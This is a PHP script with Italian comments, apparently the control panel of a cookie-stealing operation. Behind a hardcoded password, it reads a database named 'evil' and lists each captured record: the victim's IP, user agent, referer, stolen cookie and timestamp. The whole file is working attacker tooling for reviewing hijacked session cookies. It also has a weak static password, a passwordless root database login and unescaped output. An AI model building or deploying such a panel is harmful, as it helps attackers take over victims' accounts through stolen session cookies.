<?php
// Inizializza la sessione
if(!isset($_SESSION)) session_start();

// Controlla se la password è già stata verificata
if (isset($_SESSION['accesso_consentito']) && $_SESSION['accesso_consentito'] === true) {
    visualizzaDati();
} else {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Password definita staticamente per il test
        $passwordCorretta = "passwordSegreta"; // Cambia questa password
        $passwordInserita = $_POST['password'];

        if ($passwordInserita === $passwordCorretta) {
            $_SESSION['accesso_consentito'] = true;
            visualizzaDati();
        } else {
            echo "Password errata.";
            mostraFormLogin();
        }
    } else {
        mostraFormLogin();
    }
}

function mostraFormLogin() {
    echo '<form action="" method="post">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password">
            <button type="submit">Accedi</button>
          </form>';
}

function visualizzaDati() {
    // Connessione al database (aggiorna con i tuoi parametri)
    $conn = new mysqli("localhost", "root", "", "evil");
    if ($conn->connect_errno) {
        echo "Errore durante la connessione a MySQL: " . $conn->connect_error;
        exit();
    }

    // Controlla la connessione
    if ($conn->connect_error) {
        die("Connessione fallita: " . $conn->connect_error);
    }

    $sql = "SELECT * FROM cookies ORDER BY id_cookie DESC"; // Aggiorna con il nome della tua tabella
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        echo '<table>
                <tr>
                    <th>ID</th>
                    <th>IP</th>
                    <th>User Agent</th>
                    <th>Referer</th>
                    <th>Cookie</th>
                    <th>Date</th>
                </tr>';
        while ($row = $result->fetch_assoc()) {
            echo '<tr>
                    <td>' . $row["id_cookie"] . '</td>
                    <td>' . $row["ip"] . '</td>
                    <td>' . $row["user_agent"] . '</td>
                    <td>' . $row["referer"] . '</td>
                    <td>' . $row["cookie"] . '</td>
                    <td>' . $row["datetime"] . '</td>
                  </tr>';
        }
        echo '</table>';
    } else {
        echo "0 risultati";
    }
    $conn->close();
}
?>

<style>
table {
    width: 100%;
    border-collapse: collapse;
}

th, td {
    border: 1px solid #ddd;
    padding: 8px;
    text-align: left;
}

th {
    background-color: #f2f2f2;
}

tr:nth-child(even) {
    background-color: #f9f9f9;
}
</style>
